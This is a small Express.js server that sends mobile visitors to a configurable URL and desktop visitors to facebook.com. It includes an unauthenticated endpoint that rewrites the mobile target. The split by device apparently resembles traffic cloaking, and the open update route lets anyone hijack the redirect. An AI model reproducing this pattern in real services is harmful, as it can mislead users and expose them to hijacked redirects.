// @ts-nocheck
const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Load URLs dynamically
let urls = JSON.parse(fs.readFileSync("./urls.json", "utf-8"));

// Serve optional static files (fallback)
app.use(express.static("public"));

// Main redirect route
app.get("/", (req, res) => {
  const userAgent = req.headers["user-agent"] || "";
  const isMobile = /Mobi|Android|iPhone/i.test(userAgent);

  const mobileUrl = urls.mobileTargetUrl;
  const desktopUrl = "https://facebook.com";

  res.redirect(isMobile ? mobileUrl : desktopUrl);
});

// Admin: update mobile URL dynamically (optional)
app.use(express.json());
app.post("/update-mobile-url", (req, res) => {
  const { newUrl } = req.body;
  if (!newUrl || !newUrl.startsWith("http")) {
    return res.status(400).json({ error: "Invalid URL" });
  }

  urls.mobileTargetUrl = newUrl;
  fs.writeFileSync("./urls.json", JSON.stringify(urls, null, 2));
  res.json({ success: true, newUrl });
});

app.listen(PORT, () =>
  console.log(`Server running on http://localhost:${PORT}`),
);
